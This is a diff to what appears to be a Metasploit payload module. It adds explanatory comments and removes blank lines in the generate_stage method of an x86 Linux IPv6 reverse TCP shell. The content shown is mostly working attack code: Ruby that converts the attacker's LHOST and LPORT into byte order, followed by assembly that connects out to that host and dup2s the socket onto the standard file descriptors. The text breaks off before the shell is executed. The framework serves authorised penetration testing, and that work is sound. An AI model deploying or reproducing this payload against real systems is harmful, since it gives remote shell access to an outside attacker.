@@ -30,34 +30,36 @@ module MetasploitModule
   end
 
 def generate_stage
-      port_order = ([1,0])
-      tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../)
-      tcp_port.pop
-      tcp_port.shift
-      tcp_port = (port_order.map{|x| tcp_port[x]}).join('')
+      # tcp port conversion
+      port_order = ([1,0]) # byte ordering
+      tcp_port = [datastore['LPORT'].to_i].pack('n*').unpack('H*').to_s.scan(/../) # converts user input into integer and unpacked into a string array
+      tcp_port.pop     # removes the first useless / from  the array
+      tcp_port.shift   # removes the last useless  / from  the array
+      tcp_port = (port_order.map{|x| tcp_port[x]}).join('') # reorder the array and convert it to a string.
 
-      ip_order =  ([3, 2, 1, 0])
-      my_ipv6 = IPAddr.new(datastore['LHOST']).hton.scan(/..../)
+      # ipv6 address conversion
+      ip_order =  ([3, 2, 1, 0]) # byte ordering
+      my_ipv6 = IPAddr.new(datastore['LHOST']).hton.scan(/..../) # converts user's input into ipv6 hex representation
+      # first dword
       first = (my_ipv6[0].unpack('H*')).to_s.scan(/../)
       first.pop
       first.shift
       first = (ip_order.map{|x| first[x]}).join('')
-
+      # second dword
       second = (my_ipv6[1].unpack('H*')).to_s.scan(/../)
       second.pop
       second.shift
       second = (ip_order.map{|x| second[x]}).join('')
-
+      # third dword
       third = (my_ipv6[2].unpack('H*')).to_s.scan(/../)
       third.pop
       third.shift
       third = (ip_order.map{|x| third[x]}).join('')
-
+      # fourth dword
       fourth = (my_ipv6[3].unpack('H*')).to_s.scan(/../)
       fourth.pop
       fourth.shift
       fourth = (ip_order.map{|x| fourth[x]}).join('')
-
 
     payload_data =<<-EOS
         xor  ebx,ebx
@@ -83,12 +85,10 @@ def generate_stage
         xor  ebx,ebx
         push ebx
         push ebx
-
         push 0x#{fourth}
         push 0x#{third}
         push 0x#{second}
         push 0x#{first}
-
         push ebx
         push.i16 0x#{tcp_port}
         push.i16 0xa
@@ -102,29 +102,24 @@ def generate_stage
         mov bl,0x3
         mov ecx,esp
         int 0x80
-
         xor ebx,ebx
         cmp eax,ebx
         jne retry
-
         xor ecx,ecx
         mul ecx
         mov ebx,esi
         mov al,0x3f
         int 0x80
-
         xor eax,eax
         inc ecx
         mov ebx,esi
         mov al,0x3f
         int 0x80
-
         xor eax,eax
         inc ecx
         mov ebx,esi
         mov al,0x3f
         int 0x80
-
         xor edx,edx
         mul edx
         push edx
